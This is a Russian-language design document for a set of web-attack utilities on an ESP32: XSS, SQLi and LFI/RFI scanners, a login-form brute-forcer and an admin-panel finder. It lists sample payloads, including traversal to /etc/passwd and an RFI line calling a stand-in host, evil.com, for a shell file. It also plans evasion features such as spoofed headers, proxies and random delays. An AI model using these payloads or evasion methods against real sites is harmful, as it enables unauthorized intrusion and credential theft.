# Архитектура и Дизайн Web Exploit Утилит для ESP32

## 1. Обзор

Этот документ описывает архитектуру и дизайн для набора утилит веб-эксплойтов, предназначенных для запуска на ESP32. Утилиты будут интегрированы в существующий веб-интерфейс проекта.

## 2. Компоненты Системы

Система будет состоять из следующих основных компонентов:

*   **Веб-интерфейс (Frontend)**: Реализован на HTML, CSS и JavaScript. Будет расширен для управления новыми утилитами и отображения результатов.
*   **Бэкенд ESP32 (Backend)**: Реализован на C++ с использованием Arduino ESP32 framework. Будет содержать логику для выполнения тестов на уязвимости.
*   **Модули Утилит**: Каждый тип атаки (XSS, Form Brute, LFI/RFI, Admin Finder, SQLi) будет реализован как отдельный модуль на стороне ESP32.

## 3. Дизайн Веб-интерфейса

В существующий `index.html` будет добавлен новый раздел `<section id="web-exploit-controls">`.
Этот раздел будет содержать:

*   Общее поле для ввода целевого URL/IP: `<input type="text" id="web-target-url">`.
*   Отдельные подсекции для каждой утилиты, включающие:
    *   Специфичные поля ввода (например, целевой параметр для XSS, URL формы логина, параметры для LFI/RFI и SQLi).
    *   Кнопки для запуска тестов.
    *   Области для отображения статуса выполнения и результатов (`<div id="xxx-status">` и `<pre id="xxx-results">`).

Стили будут соответствовать существующему `style.css` с возможными дополнениями для новых элементов.
Файл `script.js` (не предоставлен, но предполагается его наличие) будет обновлен для обработки взаимодействия с новыми элементами UI и для связи с бэкендом ESP32.

## 4. Архитектура Бэкенда ESP32

Логика для каждой утилиты будет реализована в отдельных C++ файлах (например, `xss_tester.cpp`, `form_brute.cpp`, и т.д.) с соответствующими заголовочными файлами.

*   **Основной обработчик веб-эксплойтов**: `web_exploit_manager.cpp` / `.h` будет координировать вызовы к конкретным утилитам на основе команд от frontend.
*   **HTTP/HTTPS Клиент**: Утилиты будут использовать библиотеку `HTTPClient` (или аналогичную) для отправки запросов к целевому веб-серверу. Необходимо будет обрабатывать как HTTP, так и HTTPS.
*   **Парсинг ответов**: Логика для анализа ответов от сервера для выявления уязвимостей.

### 4.1. Структура Модулей Утилит (C++)

Каждый модуль утилиты будет иметь примерно следующую структуру:

**`xss_tester.h`**
```cpp
#ifndef XSS_TESTER_H
#define XSS_TESTER_H

#include <Arduino.h>

class XSSTester {
public:
    XSSTester();
    String test(String targetUrl, String targetParameter, const std::vector<String>& payloads);
    // ... другие методы ...
private:
    // ... приватные члены и методы ...
};

#endif
```

Аналогичные структуры будут для `FormBrute`, `LFIRFIScanner`, `AdminPanelFinder`, `SQLInjectionScanner`.

### 4.2. Обработка Запросов

ESP32 будет принимать команды от веб-интерфейса (вероятно, через WebSocket или HTTP эндпоинты, которые нужно будет определить).
Пример команды: `START_XSS;http://target.com;param_name`

## 5. Реализация Утилит

*   **XSS Тестер**:
    *   Принимает URL и опционально имя параметра/поля.
    *   Отправляет HTTP GET/POST запросы с различными XSS пейлоадами (например, `<script>alert(1)</script>`, `"><svg onload=alert(1)>`) в указанные параметры или во все найденные параметры форм.
    *   Анализирует ответ на наличие отраженного пейлоада или признаков выполнения.
*   **Form Brute**:
    *   Принимает URL формы логина, имена параметров для логина и пароля.
    *   Использует предоставленный словарь (встроенный короткий или с microSD).
    *   Перебирает комбинации логин/пароль, отправляя POST запросы.
    *   Анализирует ответы на признаки успешного/неуспешного входа.
*   **LFI/RFI Сканер**:
    *   Принимает URL и имя параметра для проверки (например, `?page=`, `?file=`).
    *   Тестирует пейлоады для LFI (например, `../../etc/passwd`, `../../../../windows/win.ini`) и RFI (например, `http://evil.com/shell.txt`).
    *   Анализирует ответы на наличие содержимого файлов или признаков выполнения удаленного кода.
*   **Admin Panel Finder**:
    *   Принимает базовый URL.
    *   Перебирает список популярных путей к админ-панелям (например, `/admin`, `/administrator`, `/login.php`, `/wp-admin`).
    *   Проверяет HTTP статусы ответов (200 OK, 403 Forbidden, 401 Unauthorized могут указывать на наличие панели).
*   **SQL-инъекция Мини-сканер**:
    *   Принимает URL и имя параметра для проверки.
    *   Отправляет базовые SQLi пейлоады (например, `' OR 1=1 --`, `" OR 1=1 --`, `1' OR '1'='1`).
    *   Анализирует ответы на наличие ошибок SQL, изменений в контенте или поведении страницы.

## 6. Безопасность и Анонимность

*   **User-Agent**: Возможность установки случайного или кастомного User-Agent для HTTP запросов.
*   **Referer**: Возможность управления заголовком Referer (удаление или подмена).
*   **Прокси**: Рассмотреть возможность (если ресурсы ESP32 позволят) базовой поддержки HTTP/SOCKS прокси для маскировки IP-адреса ESP32. Это сложная задача для ESP32.
*   **Задержки**: Введение случайных задержек между запросами для усложнения обнаружения.
*   **Очистка данных**: Не хранить чувствительные данные дольше необходимого.
*   **Предупреждения**: Отображать четкие предупреждения об этическом использовании утилит.

## 7. Хранение Данных

*   **Словари для Form Brute**: Короткий словарь может быть встроен в код. Для больших словарей потребуется поддержка microSD карты и функционал для чтения с нее.

## 8. Связь Frontend-Backend

Будет использоваться существующий механизм связи (предположительно WebSocket, судя по структуре подобных проектов для ESP32 с веб-интерфейсом).

*   **Команды от Frontend к Backend (примеры)**:
    *   `WEB_XSS_START;{target_url};{param_to_test}`
    *   `WEB_FORM_BRUTE_START;{target_url};{login_url};{user_param};{pass_param};{dictionary_type}`
    *   `WEB_LFI_RFI_START;{target_url};{param_to_test}`
    *   `WEB_ADMIN_FIND_START;{target_url}`
    *   `WEB_SQLI_START;{target_url};{param_to_test}`
    *   `WEB_EXPLOIT_STOP_ALL`
*   **Сообщения от Backend к Frontend (примеры)**:
    *   `WEB_XSS_STATUS;{status_message}`
    *   `WEB_XSS_RESULT;{found_vulnerability_details}`
    *   `WEB_FORM_BRUTE_PROGRESS;{percentage_complete};{current_attempt}`
    *   `WEB_FORM_BRUTE_SUCCESS;{username};{password}`
    *   Аналогичные сообщения для других утилит.

## 9. Интеграция с Существующим Кодом

Новые C++ файлы будут добавлены в проект. Основной `.ino` файл будет инициализировать и управлять новым `WebExploitManager`.
Функции из `utilities.h/.cpp` (например, `parseMacAddress`) нерелевантны для веб-эксплойтов, но общие утилиты для работы со строками или HTTP могут быть добавлены или использованы.
Существующие структуры атак (`DeauthStats`, `BeaconSpamStats` и т.д. из `data_structures.h`) не будут напрямую использоваться, но новые структуры для хранения состояния и результатов веб-атак могут быть добавлены в `data_structures.h` или в специфичные для веб-эксплойтов заголовочные файлы.

## 10. Дальнейшие Шаги

1.  Создать базовые C++ классы для каждой утилиты.
2.  Реализовать HTML разметку для нового раздела в `index.html`.
3.  Начать реализацию логики для XSS Тестера.

